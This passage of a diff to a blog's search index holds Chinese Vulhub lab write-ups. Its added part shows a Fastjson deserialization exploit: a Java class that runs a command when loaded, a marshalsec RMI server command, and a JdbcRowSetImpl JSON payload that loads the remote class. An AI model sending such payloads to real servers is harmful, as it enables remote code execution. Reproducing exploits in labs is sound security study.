+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268478338345.png" alt="image-20210721104233806"></p>
+<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;192.168.44.132&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p>向靶场服务器发送Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.44.132:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268478361325.png" alt="image-20210721105500291"></p>
+<p>可见，命令<code>touch /tmp/success</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210721/16268478449631.png" alt="image-20210721105551957"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</title>
     <url>/2021/07/19/Elasticsearch%E5%86%99%E5%85%A5webshell%E6%BC%8F%E6%B4%9E%EF%BC%88WooYun-2015-110216%EF%BC%89/</url>
     <content><![CDATA[<h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="noopener">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p>
@@ -122,9 +367,9 @@
       </tags>
   </entry>
   <entry>
-    <title>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</title>
+    <title>ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）</title>
     <url>/2021/07/16/ElasticSearch%20%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-3337%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</h1><p>jre版本：openjdk:8-jre</p>
+    <content><![CDATA[<h1 id="ElasticSearch-插件目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-插件目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）</h1><p>jre版本：openjdk:8-jre</p>
 <p>elasticsearch版本：v1.4.4</p>
 <p>影响版本：1.4.5以下/1.5.2以下</p>
 <p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p>
@@ -916,7 +1161,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>Apache Couchdb</tag>
-        <tag>CVE-2017-12636</tag>
       </tags>
   </entry>
   <entry>
@@ -952,7 +1196,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>Apache Couchdb</tag>
-        <tag>CVE-2017-12635</tag>
       </tags>
   </entry>
   <entry>
@@ -1174,7 +1417,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>AppWeb</tag>
-        <tag>CVE-2018-8715</tag>
       </tags>
   </entry>
   <entry>
@@ -1268,7 +1510,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>ActiveMQ</tag>
-        <tag>CVE-2016-3088</tag>
       </tags>
   </entry>
   <entry>
@@ -2034,7 +2275,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>Apache</tag>
-        <tag>CVE-2017-15715</tag>
       </tags>
   </entry>
   <entry>
@@ -2083,7 +2323,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>ActiveMQ</tag>
-        <tag>CVE-2015-5254</tag>
       </tags>
   </entry>
   <entry>
